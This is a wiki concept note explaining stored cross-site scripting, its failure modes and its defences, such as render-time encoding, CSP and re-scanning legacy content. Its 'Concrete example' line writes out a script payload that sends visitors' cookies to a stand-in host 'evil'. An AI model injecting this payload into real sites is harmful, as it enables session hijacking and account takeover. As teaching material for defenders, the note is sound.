---
type: "concept"
title: "Stored XSS"
description: "Injection persisted on the server and served to many victims"
tags: ["security", "xss", "attacks", "data"]
timestamp: "2026-08-02T00:00:00Z"
status: "growing"
---
# Stored XSS

## Summary

Stored XSS persists attacker-controlled script on the server (comments, profiles, wiki pages) and executes it for every visitor. It is the most damaging XSS class: one payload, many victims, no crafted link required.

## Details
- Mechanism: the payload is submitted once, stored in a database or file, and served to other users in their page; it executes in each victim's origin, carrying their cookies and privileges. Unlike reflected XSS there is no click-through — a single poisoned record infects every reader, including admins, which escalates to account takeover.
- Concrete example: a wiki page edited by an attacker with <script>document.location='https://evil/?c='+document.cookie</script> in a field rendered unsafely exfiltrates every visitor's session; a forum avatar URL field storing javascript: or an SVG upload with embedded script has the same effect.
- Failure modes: sanitizing on input but rendering later through an unsafe path; data exported from the DB re-entering the pipeline unescaped (e.g. in emails, exports, admin views); canonicalization and stored-vs-rendered mismatches (entity-encoded payloads stored then decoded at render); and content stored before a sanitizer fix remaining dangerous — retroactive sanitization matters.
- Operational tradeoffs: defense is render-time encoding plus sanitization for rich content, CSP, HttpOnly cookies, and Content-Security-Policy reporting; the organizational practice is treating stored content as untrusted at every output sink, forever. Periodically re-scan legacy stored content.
- RSIS3/mykb relevance: the wiki renders all stored notes through its safe-rendering pipeline; this node anchors the stored-XSS checklist and the legacy-content audit the loop runs on imported wikis.
- Legacy content: sanitize or re-encode stored content that predates the current pipeline; fixes applied after data was written do not retroactively clean it, and exports re-introduce the payloads.
- Admin surfaces: stored content re-rendered in admin views, exports, and emails is a separate sink; each output context needs its own encoding even when the primary page is safe.

## Related
- [[wiki/api-protocols/web-security-owasp|Web Security (OWASP)]]
- [[wiki/web-platforms/polyglot-xss|Polyglot XSS]]
- [[wiki/web-platforms/mutation-xss|Mutation XSS]]
- [[wiki/web-platforms/dom-xss|DOM XSS]]
- [[wiki/security-auth/xss-prevention|XSS Prevention]]
- [[wiki/web-platforms/dom-manipulation|DOM Manipulation]]
- [[wiki/web-platforms/web-apis|Web APIs]]
